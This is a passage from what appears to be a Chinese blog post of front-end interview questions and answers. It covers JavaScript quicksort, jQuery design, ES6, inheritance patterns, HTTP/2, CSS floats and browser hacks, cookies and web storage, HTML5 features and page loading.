，存放函数的参数值，局部变量的值等。</p><p>堆区（heap）   —   一般由程序员分配释放，   若程序员不释放，程序结束时可能由OS回收。</p><p>堆（数据结构）：堆可以被看成是一棵树，如：堆排序；</p><p>栈（数据结构）：一种先进后出的数据结构。</p><h2 id="22-快速-排序的思想并实现一个快排？"><a href="#22-快速-排序的思想并实现一个快排？" class="headerlink" title="==22. 快速 排序的思想并实现一个快排？=="></a>==22. 快速 排序的思想并实现一个快排？==</h2><p>“快速排序”的思想很简单，整个排序过程只需要三步：</p><p>　　（1）在数据集之中，找一个基准点<br>　　<br>　　（2）建立两个数组，分别存储左边和右边的数组<br>　　<br>　　（3）利用递归进行下次比较　　</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><script type="text/javascript"></span><br><span class="line">    function quickSort(arr){</span><br><span class="line">        if(arr.length<=1){</span><br><span class="line">            return arr;//如果数组只有一个数，就直接返回；</span><br><span class="line">        }</span><br><span class="line">        var num = Math.floor(arr.length/2);//找到中间数的索引值，如果是浮点数，则向下取整</span><br><span class="line">        var numValue = arr.splice(num,1);//找到中间数的值</span><br><span class="line">        var left = [];</span><br><span class="line">        var right = [];</span><br><span class="line">        for(var i=0;i<arr.length;i++){</span><br><span class="line">            if(arr[i]<numValue){</span><br><span class="line">                left.push(arr[i]);//基准点的左边的数传到左边数组</span><br><span class="line">            }</span><br><span class="line">            else{</span><br><span class="line">               right.push(arr[i]);//基准点的右边的数传到右边数组</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        return quickSort(left).concat([numValue],quickSort(right));//递归不断重复比较</span><br><span class="line">    }</span><br><span class="line">    alert(quickSort([32,45,37,16,2,87]));//弹出“2,16,32,37,45,87”</span><br><span class="line"></script></span><br></pre></td></tr></tbody></table></figure><h2 id="23-你觉得jQuery或zepto源码有哪些写的好的地方"><a href="#23-你觉得jQuery或zepto源码有哪些写的好的地方" class="headerlink" title="==23. 你觉得jQuery或zepto源码有哪些写的好的地方=="></a>==23. 你觉得jQuery或zepto源码有哪些写的好的地方==</h2><p>jquery源码封装在一个匿名函数的自执行环境中，有助于防止变量的全局污染，然后通过传入window对象参数，可以使window对象作为局部变量使用，好处是当jquery中访问window对象的时候，就不用将作用域链退回到顶层作用域了，从而可以更快的访问window对象。同样，传入undefined参数，可以缩短查找undefined时的作用域链。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(function( window, undefined ) {</span><br><span class="line">     //用一个函数域包起来，就是所谓的沙箱</span><br><span class="line">     //在这里边var定义的变量，属于这个函数域内的局部变量，避免污染全局</span><br><span class="line">     //把当前沙箱需要的外部变量通过函数参数引入进来</span><br><span class="line">     //只要保证参数对内提供的接口的一致性，你还可以随意替换传进来的这个参数</span><br><span class="line">    window.jQuery = window.$ = jQuery;</span><br><span class="line">})( window );</span><br></pre></td></tr></tbody></table></figure><p>jquery将一些原型属性和方法封装在了jquery.prototype中，为了缩短名称，又赋值给了jquery.fn，这是很形象的写法。</p><p>有一些数组或对象的方法经常能使用到，jQuery将其保存为局部变量以提高访问速度。</p><p>jquery实现的链式调用可以节约代码，所返回的都是同一个对象，可以提高代码效率。</p><h2 id="24-ES6的了解"><a href="#24-ES6的了解" class="headerlink" title="==24. ES6的了解=="></a>==24. ES6的了解==</h2><p>新增模板字符串（为JavaScript提供了简单的字符串插值功能）、箭头函数（操作符左边为输入的参数，而右边则是进行的操作以及返回的值Inputs=>outputs。）、for-of（用来遍历数据—例如数组中的值。）arguments对象可被不定参数和默认参数完美代替。ES6将promise对象纳入规范，提供了原生的Promise对象。增加了let和const命令，用来声明变量。增加了块级作用域。let命令实际上就增加了块级作用域。ES6规定，var命令和function命令声明的全局变量，属于全局对象的属性；let命令、const命令、class命令声明的全局变量，不属于全局对象的属性。还有就是引入module模块的概念。</p><h2 id="25-js继承方式及其优缺点"><a href="#25-js继承方式及其优缺点" class="headerlink" title="==25. js继承方式及其优缺点=="></a>==25. js继承方式及其优缺点==</h2><p><strong>原型链继承的缺点</strong></p><blockquote><p>一是字面量重写原型会中断关系，使用引用类型的原型，并且子类型还无法给超类型传递参数。</p></blockquote><p><strong>借用构造函数（类式继承）</strong></p><blockquote><p>借用构造函数虽然解决了刚才两种问题，但没有原型，则复用无从谈起。所以我们需要原型链+借用构造函数的模式，这种模式称为组合继承</p></blockquote><p><strong>组合式继承</strong></p><blockquote><p>组合式继承是比较常用的一种继承方法，其背后的思路是 使用原型链实现对原型属性和方法的继承，而通过借用构造函数来实现对实例属性的继承。这样，既通过在原型上定义方法实现了函数复用，又保证每个实例都有它自己的属性。</p></blockquote><h2 id="26-关于Http-2-0-你知道多少？"><a href="#26-关于Http-2-0-你知道多少？" class="headerlink" title="==26. 关于Http 2.0 你知道多少？=="></a>==26. 关于Http 2.0 你知道多少？==</h2><p>HTTP/2引入了“服务端推（server push）”的概念，它允许服务端在客户端需要数据之前就主动地将数据发送到客户端缓存中，从而提高性能。</p><p>HTTP/2提供更多的加密支持</p><p>HTTP/2使用多路技术，允许多个消息在一个连接上同时交差。</p><p>它增加了头压缩（header compression），因此即使非常小的请求，其请求和响应的header都只会占用很小比例的带宽。</p><h2 id="27-defer和async"><a href="#27-defer和async" class="headerlink" title="==27. defer和async=="></a>==27. defer和async==</h2><ul><li>defer并行加载js文件，会按照页面上script标签的顺序执行</li><li>async并行加载js文件，下载完成立即执行，不会按照页面上script标签的顺序执行</li></ul><h2 id="28-谈谈浮动和清除浮动"><a href="#28-谈谈浮动和清除浮动" class="headerlink" title="==28. 谈谈浮动和清除浮动=="></a>==28. 谈谈浮动和清除浮动==</h2><p>浮动的框可以向左或向右移动，直到他的外边缘碰到包含框或另一个浮动框的边框为止。由于浮动框不在文档的普通流中，所以文档的普通流的块框表现得就像浮动框不存在一样。浮动的块框会漂浮在文档普通流的块框上。</p><h2 id="29-如何评价AngularJS和BackboneJS"><a href="#29-如何评价AngularJS和BackboneJS" class="headerlink" title="==29. 如何评价AngularJS和BackboneJS=="></a>==29. 如何评价AngularJS和BackboneJS==</h2><p>backbone具有依赖性，依赖underscore.js。Backbone + Underscore + jQuery(or Zepto) 就比一个AngularJS 多出了2 次HTTP请求.</p><p>Backbone的Model没有与UI视图数据绑定，而是需要在View中自行操作DOM来更新或读取UI数据。AngularJS与此相反，Model直接与UI视图绑定，Model与UI视图的关系，通过directive封装，AngularJS内置的通用directive，就能实现大部分操作了，也就是说，基本不必关心Model与UI视图的关系，直接操作Model就行了，UI视图自动更新。</p><p>AngularJS的directive，你输入特定数据，他就能输出相应UI视图。是一个比较完善的前端MVW框架，包含模板，数据双向绑定，路由，模块化，服务，依赖注入等所有功能，模板功能强大丰富，并且是声明式的，自带了丰富的 Angular 指令。</p><h2 id="30-用过哪些设计模式？"><a href="#30-用过哪些设计模式？" class="headerlink" title="==30. 用过哪些设计模式？=="></a>==30. 用过哪些设计模式？==</h2><h4 id="工厂模式："><a href="#工厂模式：" class="headerlink" title="工厂模式："></a><strong>工厂模式：</strong></h4><p>主要好处就是可以消除对象间的耦合，通过使用工程方法而不是new关键字。将所有实例化的代码集中在一个位置防止代码重复。</p><p>工厂模式解决了重复实例化的问题 ，但还有一个问题,那就是识别问题，因为根本无法 搞清楚他们到底是哪个对象的实例。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function createObject(name,age,profession){//集中实例化的函数var obj = new Object();</span><br><span class="line">    obj.name = name;</span><br><span class="line">    obj.age = age;</span><br><span class="line">    obj.profession = profession;</span><br><span class="line">    obj.move = function () {</span><br><span class="line">        return this.name + ' at ' + this.age + ' engaged in ' + this.profession;</span><br><span class="line">    };</span><br><span class="line">    return obj;</span><br><span class="line">}</span><br><span class="line">var test1 = createObject('trigkit4',22,'programmer');//第一个实例var test2 = createObject('mike',25,'engineer');//第二个实例</span><br></pre></td></tr></tbody></table></figure><h4 id="构造函数模式"><a href="#构造函数模式" class="headerlink" title="构造函数模式"></a><strong>构造函数模式</strong></h4><p>使用构造函数的方法 ，即解决了重复实例化的问题 ，又解决了对象识别的问题，该模式与工厂模式的不同之处在于：</p><ol><li>构造函数方法没有显示的创建对象 (new Object());</li><li>直接将属性和方法赋值给 this 对象;</li><li>没有 renturn 语句。</li></ol><h2 id="31-说说你对闭包的理解"><a href="#31-说说你对闭包的理解" class="headerlink" title="==31. 说说你对闭包的理解=="></a>==31. 说说你对闭包的理解==</h2><p>使用闭包主要是为了设计私有的方法和变量。闭包的优点是可以避免全局变量的污染，缺点是闭包会常驻内存，会增大内存使用量，使用不当很容易造成内存泄露。在js中，函数即闭包，只有函数才会产生作用域的概念</p><p>闭包有三个特性：</p><ol><li>函数嵌套函数</li><li>函数内部可以引用外部的参数和变量</li><li>参数和变量不会被垃圾回收机制回收</li></ol><h2 id="32-请你谈谈Cookie的弊端"><a href="#32-请你谈谈Cookie的弊端" class="headerlink" title="==32. 请你谈谈Cookie的弊端=="></a>==32. 请你谈谈Cookie的弊端==</h2><p>cookie虽然在持久保存客户端数据提供了方便，分担了服务器存储的负担，但还是有很多局限性的。</p><p>第一：每个特定的域名下最多生成20个cookie</p><ol><li>IE6或更低版本最多20个cookie</li><li>IE7和之后的版本最后可以有50个cookie。</li><li>Firefox最多50个cookie</li><li>chrome和Safari没有做硬性限制</li></ol><p>IE和Opera 会清理近期最少使用的cookie，Firefox会随机清理cookie。<br>cookie的最大大约为4096字节，为了兼容性，一般不能超过4095字节。</p><p>IE 提供了一种存储可以持久化用户数据，叫做userdata，从IE5.0就开始支持。每个数据最多128K，每个域名下最多1M。这个持久化数据放在缓存中，如果缓存没有清理，那么会一直存在</p><p><strong>优点：极高的扩展性和可用性</strong></p><ol><li>通过良好的编程，控制保存在cookie中的session对象的大小。</li><li>通过加密和安全传输技术（SSL），减少cookie被破解的可能性。</li><li>只在cookie中存放不敏感数据，即使被盗也不会有重大损失。</li><li>控制cookie的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的cookie。</li></ol><p><strong>缺点：</strong></p><ol><li><code>Cookie</code>数量和长度的限制。每个domain最多只能有20条cookie，每个cookie长度不能超过4KB，否则会被截掉.</li><li>安全性问题。如果cookie被人拦截了，那人就可以取得所有的session信息。即使加密也与事无补，因为拦截者并不需要知道cookie的意义，他只要原样转发cookie就可以达到目的了。</li><li>有些状态不可能保存在客户端。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。</li></ol><h2 id="33-web-storage和cookie的区别"><a href="#33-web-storage和cookie的区别" class="headerlink" title="==33. web storage和cookie的区别=="></a>==33. web storage和cookie的区别==</h2><p>Web Storage的概念和cookie相似，区别是它是为了更大容量存储设计的。Cookie的大小是受限的，并且每次你请求一个新的页面的时候Cookie都会被发送过去，这样无形中浪费了带宽，另外cookie还需要指定作用域，不可以跨域调用。</p><p>除此之外，Web Storage拥有setItem,getItem,removeItem,clear等方法，不像cookie需要前端开发者自己封装setCookie，getCookie。</p><p>但是cookie也是不可以或缺的：cookie的作用是与服务器进行交互，作为HTTP规范的一部分而存在 ，而Web Storage仅仅是为了在本地“存储”数据而生</p><p>浏览器的支持除了IE７及以下不支持外，其他标准浏览器都完全支持(ie及FF需在web服务器里运行)，值得一提的是IE总是办好事，例如IE7、IE6中的userData其实就是javascript本地存储的解决方案。通过简单的代码封装可以统一到所有的浏览器都支持web storage。</p><p>localStorage和sessionStorage都具有相同的操作方法，例如setItem、getItem和removeItem等</p><h2 id="34-cookie-和-session-的区别："><a href="#34-cookie-和-session-的区别：" class="headerlink" title="==34. cookie 和 session 的区别：=="></a>==34. cookie 和 session 的区别：==</h2><ol><li><p>cookie数据存放在客户的浏览器上，session数据放在服务器上。</p></li><li><p>cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗</p><p>考虑到安全应当使用session。</p></li><li><p>session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能</p><p> 考虑到减轻服务器性能方面，应当使用COOKIE。</p></li><li><p>单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。</p></li><li><p>所以个人建议：</p><p>将登陆信息等重要信息存放为SESSION</p><p>其他信息如果需要保留，可以放在COOKIE中</p></li></ol><h2 id="35-display-none和visibility-hidden的区别？"><a href="#35-display-none和visibility-hidden的区别？" class="headerlink" title="==35. display:none和visibility:hidden的区别？=="></a>==35. display:none和visibility:hidden的区别？==</h2><ul><li>display:none  隐藏对应的元素，在文档布局中不再给它分配空间，它各边的元素会合拢，就当他从来不存在。</li><li>visibility:hidden  隐藏对应的元素，但是在文档布局中仍保留原来的空间。</li></ul><h2 id="36-position-absolute和float属性的异同"><a href="#36-position-absolute和float属性的异同" class="headerlink" title="==36. position:absolute和float属性的异同=="></a>==36. position:absolute和float属性的异同==</h2><ul><li>共同点：对内联元素设置float和absolute属性，可以让元素脱离文档流，并且可以设置其宽高。</li><li>不同点：float仍会占据位置，absolute会覆盖文档流中的其他元素。</li></ul><h2 id="37-介绍一下box-sizing属性？"><a href="#37-介绍一下box-sizing属性？" class="headerlink" title="==37. 介绍一下box-sizing属性？=="></a>==37. 介绍一下box-sizing属性？==</h2><p>box-sizing属性主要用来控制元素的盒模型的解析模式。默认值是content-box。</p><ul><li>content-box：让元素维持W3C的标准盒模型。元素的宽度/高度由border + padding + content的宽度/高度决定，设置width/height属性指的是content部分的宽/高</li><li>border-box：让元素维持IE传统盒模型（IE6以下版本和IE6~7的怪异模式）。设置width/height属性指的是border + padding + content</li></ul><p>标准浏览器下，按照W3C规范对盒模型解析，一旦修改了元素的边框或内距，就会影响元素的盒子尺寸，就不得不重新计算元素的盒子尺寸，从而影响整个页面的布局。</p><h2 id="38-CSS3新增伪类举例："><a href="#38-CSS3新增伪类举例：" class="headerlink" title="==38. CSS3新增伪类举例：=="></a>==38. CSS3新增伪类举例：==</h2><ul><li>p:first-of-type 选择属于其父元素的首个 <p> 元素的每个 </p><p> 元素。</p></li><li>p:last-of-type  选择属于其父元素的最后 <p> 元素的每个 </p><p> 元素。</p></li><li>p:only-of-type  选择属于其父元素唯一的 <p> 元素的每个 </p><p> 元素。</p></li><li>p:only-child    选择属于其父元素的唯一子元素的每个 <p> 元素。</p></li><li>p:nth-child(2)  选择属于其父元素的第二个子元素的每个 <p> 元素。</p></li><li>:enabled  :disabled 控制表单控件的禁用状态。</li><li>:checked        单选框或复选框被选中。</li></ul><h2 id="39-CSS3有哪些新特性？"><a href="#39-CSS3有哪些新特性？" class="headerlink" title="==39. CSS3有哪些新特性？=="></a>==39. CSS3有哪些新特性？==</h2><ul><li>CSS3实现圆角（border-radius），阴影（box-shadow），</li><li>对文字加特效（text-shadow、），线性渐变（gradient），旋转（transform）</li><li>transform:rotate(9deg) scale(0.85,0.90) translate(0px,-30px) skew(-9deg,0deg);//旋转,缩放,定位,倾斜</li><li>增加了更多的CSS选择器  多背景 rgba</li><li>在CSS3中唯一引入的伪元素是::selection.</li><li>媒体查询，多栏布局</li><li>border-image</li><li><p>CSS3中新增了一种盒模型计算方式：box-sizing。盒模型默认的值是content-box, 新增的值是padding-box和border-box，几种盒模型计算元素宽高的区别如下：</p><ul><li>content-box（默认）<ul><li>布局所占宽度Width：Width = width + padding-left + padding-right + border-left + border-right</li><li>布局所占高度Height:Height = height + padding-top + padding-bottom + border-top + border-bottom</li></ul></li><li>padding-box<ul><li>布局所占宽度Width：Width = width(包含padding-left + padding-right) + border-top + border-bottom</li><li>布局所占高度Height:height(包含padding-top + padding-bottom) + border-top + border-bottom</li></ul></li><li><p>border-box</p><ul><li><p>布局所占宽度Width：Width = width(包含padding-left + padding-right + border-left + border-right)</p></li><li><p>布局所占高度Height: Height = height(包含padding-top + padding-bottom + border-top + border-bottom)</p></li></ul></li></ul></li></ul><h2 id="40-HTML与XHTML——二者有什么区别"><a href="#40-HTML与XHTML——二者有什么区别" class="headerlink" title="==40. HTML与XHTML——二者有什么区别=="></a>==40. HTML与XHTML——二者有什么区别==</h2><p>区别：</p><ol><li>所有的标记都必须要有一个相应的结束标记</li><li>所有标签的元素和属性的名字都必须使用小写</li><li>所有的XML标记都必须合理嵌套</li><li>所有的属性必须用引号””括起来</li><li>把所有<和&特殊符号用编码表示</li><li>给所有属性赋一个值</li><li>不要在注释内容中使“–”</li><li>图片必须有说明文字</li></ol><h2 id="41-常见兼容性问题？"><a href="#41-常见兼容性问题？" class="headerlink" title="==41. 常见兼容性问题？=="></a>==41. 常见兼容性问题？==</h2><p>png24位的图片在iE6浏览器上出现背景，解决方案是做成PNG8.也可以引用一段脚本处理.</p><p>浏览器默认的margin和padding不同。解决方案是加一个全局的*{margin:0;padding:0;}来统一。</p><p>IE6双边距bug:块属性标签float后，又有横行的margin情况下，在ie6显示margin比设置的大。</p><p>浮动ie产生的双倍距离（IE6双边距问题：在IE6下，如果对元素设置了浮动，同时又设置了margin-left或margin-right，margin值会加倍。）</p><p>#box{ float:left; width:10px; margin:0 0 0 100px;}</p><p>这种情况之下IE会产生20px的距离，解决方案是在float的标签样式控制中加入<br><em>display:inline;将其转化为行内属性。(</em>这个符号只有ie6会识别)</p><p>渐进识别的方式，从总体中逐渐排除局部。</p><p>  首先，巧妙的使用“\9”这一标记，将IE游览器从所有情况中分离出来。</p><p>  接着，再次使用“+”将IE8和IE7、IE6分离开来，这样IE8已经独立识别。</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.bb</span>{</span><br><span class="line"></span><br><span class="line">       <span class="attribute">background-color</span>:<span class="number">#f1ee18</span>;<span class="comment">/*所有识别*/</span></span><br><span class="line"></span><br><span class="line">      <span class="attribute">.background-color</span>:<span class="number">#00deff</span>\<span class="number">9</span>; <span class="comment">/*IE6、7、8识别*/</span></span><br><span class="line"></span><br><span class="line">      +background-color:#a200ff;/*IE6、7识别*/</span><br><span class="line"></span><br><span class="line">      _<span class="selector-tag">background-color</span>:<span class="selector-id">#1e0bd1</span>;<span class="comment">/*IE6识别*/</span></span><br><span class="line"></span><br><span class="line">      }</span><br></pre></td></tr></tbody></table></figure><p>异模式问题：漏写DTD声明，Firefox仍然会按照标准模式来解析网页，但在IE中会触发<br>怪异模式。为避免怪异模式给我们带来不必要的麻烦，最好养成书写DTD声明的好习惯。现在<br>可以使用<a href="http://www.w3.org/TR/html5/single-page.html" target="_blank" rel="noopener">html5</a>推荐的写法：<code><doctype html></code></p><h2 id="42-解释下浮动和它的工作原理？清除浮动的技巧"><a href="#42-解释下浮动和它的工作原理？清除浮动的技巧" class="headerlink" title="==42. 解释下浮动和它的工作原理？清除浮动的技巧=="></a>==42. 解释下浮动和它的工作原理？清除浮动的技巧==</h2><p>浮动元素脱离文档流，不占据空间。浮动元素碰到包含它的边框或者浮动元素的边框停留。</p><p>1.使用空标签清除浮动。</p><p>   这种方法是在所有浮动标签后面添加一个空标签 定义css clear:both. 弊端就是增加了无意义标签。</p><p>2.使用overflow。</p><p>   给包含浮动元素的父标签添加css属性 overflow:auto; zoom:1; zoom:1用于兼容IE6。</p><p>3.使用after伪对象清除浮动。</p><p>   该方法只适用于非IE浏览器。具体写法可参照以下示例。使用中需注意以下几点。一、该方法中必须为需要清除浮动元素的伪对象中设置 height:0，否则该元素会比实际高出若干像素；</p><h2 id="43-html5有哪些新特性、移除了那些元素？如何处理HTML5新标签的浏览器兼容问题？如何区分-HTML-和-HTML5？"><a href="#43-html5有哪些新特性、移除了那些元素？如何处理HTML5新标签的浏览器兼容问题？如何区分-HTML-和-HTML5？" class="headerlink" title="==43. html5有哪些新特性、移除了那些元素？如何处理HTML5新标签的浏览器兼容问题？如何区分 HTML 和 HTML5？=="></a>==43. html5有哪些新特性、移除了那些元素？如何处理HTML5新标签的浏览器兼容问题？如何区分 HTML 和 HTML5？==</h2><p>HTML5 现在已经不是 SGML 的子集，主要是关于图像，位置，存储，多任务等功能的增加。</p><p>拖拽释放(Drag and drop) API</p><p>语义化更好的内容标签（header,nav,footer,aside,article,section）</p><p>音频、视频API(audio,video)</p><p>画布(Canvas) API</p><p>地理(Geolocation) API</p><p>本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失；</p><p>sessionStorage 的数据在浏览器关闭后自动删除</p><p>表单控件，calendar、date、time、email、url、search</p><p>新的技术webworker, websocket, Geolocation</p><p><strong>移除的元素</strong></p><p>纯表现的元素：basefont，big，center，font, s，strike，tt，u；</p><p>对可用性产生负面影响的元素：frame，frameset，noframes；</p><h2 id="44-什么是-FOUC（无样式内容闪烁）？你如何来避免-FOUC？"><a href="#44-什么是-FOUC（无样式内容闪烁）？你如何来避免-FOUC？" class="headerlink" title="==44. 什么是 FOUC（无样式内容闪烁）？你如何来避免 FOUC？=="></a>==44. 什么是 FOUC（无样式内容闪烁）？你如何来避免 FOUC？==</h2><p>FOUC - Flash Of Unstyled Content 文档样式闪烁</p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><style type="text/css" media="all">@import "../fouc.css";</style></span><br></pre></td></tr></tbody></table></figure><p>而引用CSS文件的@import就是造成这个问题的罪魁祸首。IE会先加载整个HTML文档的DOM，然后再去导入外部的CSS文件，因此，在页面DOM加载完成到CSS导入完成中间会有一段时间页面上的内容是没有样式的，这段时间的长短跟网速，电脑速度都有关系。<br> 解决方法简单的出奇，只要在<meta name="generator" content="Hexo 3.9.0">之间加入一个<link>或者<script>元素就可以了。</p><h2 id="45-null和undefined的区别？"><a href="#45-null和undefined的区别？" class="headerlink" title="==45. null和undefined的区别？=="></a>==45. null和undefined的区别？==</h2><p>null是一个表示”无”的对象，转为数值时为0；undefined是一个表示”无”的原始值，转为数值时为NaN。</p><p>当声明的变量还未被初始化时，变量的默认值为undefined。</p><ul><li>null用来表示尚未存在的对象，常用来表示函数企图返回一个不存在的对象。</li><li>undefined表示”缺少值”，就是此处应该有一个值，但是还没有定义。典型用法是：</li></ul><ol><li>变量被声明了，但没有赋值时，就等于undefined。</li><li>调用函数时，应该提供的参数没有提供，该参数等于undefined。</li><li>对象没有赋值的属性，该属性的值为undefined。</li><li>函数没有返回值时，默认返回undefined。</li></ol><p>null表示”没有对象”，即该处不应该有值。典型用法是：</p><ol><li>作为函数的参数，表示该函数的参数不是对象。</li><li>作为对象原型链的终点。</li></ol><h2 id="46-new操作符具体干了什么呢"><a href="#46-new操作符具体干了什么呢" class="headerlink" title="==46. new操作符具体干了什么呢?=="></a>==46. new操作符具体干了什么呢?==</h2><ol><li>创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型。</li><li>属性和方法被加入到 this 引用的对象中。</li><li>新创建的对象由 this 所引用，并且最后隐式的返回 this 。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj  = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">obj.__proto__ = Base.prototype;</span><br><span class="line"></span><br><span class="line">Base.call(obj);</span><br></pre></td></tr></table></figure><h2 id="47-js延迟加载的方式有哪些？"><a href="#47-js延迟加载的方式有哪些？" class="headerlink" title="==47. js延迟加载的方式有哪些？=="></a>==47. js延迟加载的方式有哪些？==</h2><p>defer和async、动态创建DOM方式（创建script，插入到DOM中，加载完毕后callBack）、按需异步载入js</p><h2 id="48-哪些操作会造成内存泄漏？"><a href="#48-哪些操作会造成内存泄漏？" class="headerlink" title="==48. 哪些操作会造成内存泄漏？=="></a>==48. 哪些操作会造成内存泄漏？==</h2><p>内存泄漏指任何对象在您不再拥有或需要它之后仍然存在。</p><p>垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。</p><p>setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。</p><p>闭包、控制台日志、循环（在两个对象彼此引用且彼此保留时，就会产生一个循环）</p><h2 id="49-列举IE-与其他浏览器不一样的特性？"><a href="#49-列举IE-与其他浏览器不一样的特性？" class="headerlink" title="==49. 列举IE 与其他浏览器不一样的特性？=="></a>==49. 列举IE 与其他浏览器不一样的特性？==</h2><ul><li>IE支持currentStyle，FIrefox使用getComputStyle</li><li>IE 使用innerText，Firefox使用textContent</li><li>滤镜方面：IE:filter:alpha(opacity= num)；Firefox：-moz-opacity:num</li><li>事件方面：IE：attachEvent：火狐是addEventListener</li><li>鼠标位置：IE是event.clientX；火狐是event.pageX</li><li>IE使用event.srcElement；Firefox使用event.target</li><li>IE中消除list的原点仅需margin:0即可达到最终效果；FIrefox需要设置margin:0;padding:0以及list-style:none</li><li>CSS圆角：ie7以下不支持圆角</li></ul><h2 id="50-WEB应用从服务器主动推送Data到客户端有那些方式？"><a href="#50-WEB应用从服务器主动推送Data到客户端有那些方式？" class="headerlink" title="==50. WEB应用从服务器主动推送Data到客户端有那些方式？=="></a>==50. WEB应用从服务器主动推送Data到客户端有那些方式？==</h2><p>Javascript数据推送</p><ul><li>Commet：基于HTTP长连接的服务器推送技术</li><li>基于WebSocket的推送方案</li><li>SSE（Server-Send Event）：服务器推送数据新方式</li></ul><h2 id="51-对前端界面工程师这个职位是怎么样理解的？它的前景会怎么样？"><a href="#51-对前端界面工程师这个职位是怎么样理解的？它的前景会怎么样？" class="headerlink" title="==51. 对前端界面工程师这个职位是怎么样理解的？它的前景会怎么样？=="></a>==51. 对前端界面工程师这个职位是怎么样理解的？它的前景会怎么样？==</h2><p>前端是最贴近用户的程序员，比后端、数据库、产品经理、运营、安全都近。</p><pre><code>1、实现界面交互2、提升用户体验3、有了Node.js，前端可以实现服务端的一些事情</code></pre><p>前端是最贴近用户的程序员，前端的能力就是能让产品从 90分进化到 100 分，甚至更好，<br>参与项目，快速高质量完成实现效果图，精确到1px；</p><p> 与团队成员，UI设计，产品经理的沟通；</p><p> 做好的页面结构，页面重构和用户体验；</p><p> 处理hack，兼容、写出优美的代码格式；</p><p> 针对服务器的优化、拥抱最新前端技术。</p><h2 id="52-一个页面从输入-URL-到页面加载显示完成，这个过程中都发生了什么？"><a href="#52-一个页面从输入-URL-到页面加载显示完成，这个过程中都发生了什么？" class="headerlink" title="==52. 一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？=="></a>==52. 一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？==</h2><p>分为4个步骤：</p><pre><code>（1） 当发送一个URL请求时，不管这个URL是Web页面的URL还是Web页面上每个资源的URL，浏览器都会开启一个线程来处理这个请求，同时在远程DNS服务器上启动一个DNS查询。这能使浏览器获得请求对应的IP地址。（2） 浏览器与远程`Web`服务器通过`TCP`三次握手协商来建立一个`TCP/IP`连接。该握手包括一个同步报文，一个同步-应答报文和一个应答报文，这三个报文在 浏览器和服务器之间传递。该握手首先由客户端尝试建立起通信，而后服务器应答并接受客户端的请求，最后由客户端发出该请求已经被接受的报文。（3） 一旦`TCP/IP`连接建立，浏览器会通过该连接向远程服务器发送`HTTP`的`GET`请求。远程服务器找到资源并使用HTTP响应返回该资源，值为200的HTTP响应状态表示一个正确的响应。（4） 此时，`Web`服务器提供资源服务，客户端开始下载资源。</code></pre><p>请求返回后，便进入了我们关注的前端模块</p><p>简单来说，浏览器会解析<code>HTML</code>生成<code>DOM Tree</code>，其次会根据CSS生成CSS Rule Tree，而<code>javascript</code>又可以根据<code>DOM API</code>操作<code>DOM</code></p><h2 id="53-javascript对象的几种创建方式"><a href="#53-javascript对象的几种创建方式" class="headerlink" title="==53. javascript对象的几种创建方式=="></a>==53. javascript对象的几种创建方式==</h2><ol><li>工厂模式</li><li>构造函数模式</li><li>原型模式</li><li>混合构造函数和原型模式</li><li>动态原型模式</li><li>寄生构造函数模式</li><li>稳妥构造函数模式</li></ol><h2 id="54-javascript继承的6种方法"><a href="#54-javascript继承的6种方法" class="headerlink" title="==54. javascript继承的6种方法=="></a>==54. javascript继承的6种方法==</h2><ol><li>原型链继承</li><li>借用构造函数继承</li><li>组合继承(原型+借用构造)</li><li>原型式继承</li><li>寄生式继承</li><li>寄生组合式继承</li></ol><h2 id="55-创建ajax的过程"><a href="#55-创建ajax的过程" class="headerlink" title="==55. 创建ajax的过程=="></a>==55. 